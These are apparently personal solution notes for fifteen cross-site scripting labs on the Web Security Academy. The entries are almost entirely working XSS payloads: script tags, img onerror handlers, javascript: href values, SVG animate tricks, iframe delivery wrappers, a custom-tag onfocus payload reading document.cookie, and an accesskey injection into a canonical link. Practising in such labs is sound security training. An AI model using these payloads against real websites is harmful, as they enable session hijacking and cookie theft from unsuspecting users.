1. Reflected XSS into HTML context with nothing encoded

`<script>alert()</script>`

2. DOM XSS in document.write sink using source location.search

```txt
**source** "><img src=x onerror=alert()>
```

3. DOM XSS in innerHTML sink using source location.search

`<img src=1 onerror=alert()>`

4. DOM XSS in jQuery anchor href attribute sink using location.search source

```txt
**https://something.../feedback?returnPath=** javascript:alert()
```

5. DOM XSS in jQuery selector sink using a hashchange event

```txt
https://something.../#hashname<img src=x onerror=alert()>

<iframe src="https://something.../#" onload = "this.src = this.src + '%3Cimg%20src=x%20onerror=print()%3E'">
```

6. Reflected XSS into attribute with angle brackets HTML-encoded

```txt
**search result: 0 search results for** asd" onmouseover="alert()

<input type="text" placeholder="Search the blog..." name="search" value="asd" onmouseover="alert()">
```

7. DOM XSS in document.write sink using source location.search inside a select element

```txt
**original url:** https://.../product?productId=3

**payload**: https://.../product?productId=3&storeId="</select><img src=x onerror=alert()>

(`&` to interact with target script code. `storeId` is a var of target script. `</select>` to escape)
```

8. Simple Stored DOM XSS

`asd <asd> <img src=x onerror=alert()>`

(target filter out the first tag)

9. Reflected XSS into HTML context with most tags and attributes blocked

```txt
<body onresize=alert(1)>

<iframe src="https://something.../?search=%3Cbody%20onresize%3Dprint%28%29%3E" onload="this.style.width = '500px'">
```

10. Reflected XSS into HTML context with all tags blocked except custom ones

```txt
/?search=<custom id='x' tabindex=1 onfocus=alert()>asd</custom>#x

<script>
location="https://0a40002f03ef80f3c779dd7300c400f0.web-security-academy.net/?search=%3Ccustom+id%3D%27x%27+tabindex%3D1+onfocus%3Dalert(document.cookie)%3Easd%3C%2Fcustom%3E#x"
</script>
```

11. Reflected XSS with event handlers and href attributes blocked

```txt
<animate  attributeName=href values=javascript:alert() />

<svg><a><animate attributeName=href values=javascript:alert() /><text x=20 y=20>Click</text></a></svg>
```

12. Reflected XSS with some SVG markup allowed

`<svg><animateTransform onbegin=alert()>`

13. Reflected XSS into attribute with angle brackets HTML-encoded

```
0 search results for 'asd" autofocus onfocus=alert()

<input type="text" placeholder="Search the blog..." name="search" value="asd" autofocus="" onfocus="alert()>

asd" autofocus onfocus=alert()
```

14. Stored XSS into anchor href attribute with double quotes HTML-encoded:

`<a id="author" href="javascript:alert(document.domain)">asd</a>`

15. Reflected XSS in canonical link tag:

```
<link rel="canonical" href="https://0a8c00840479533f80880daf004200f0.web-security-academy.net/?test=here">


t/?test=here%09'accesskey='X'%09onclick='alert(1)

<link rel="canonical" href="https://0a8c00840479533f80880daf004200f0.web-security-academy.net/?test=here	" accesskey="X" onclick="alert(1)">
```

















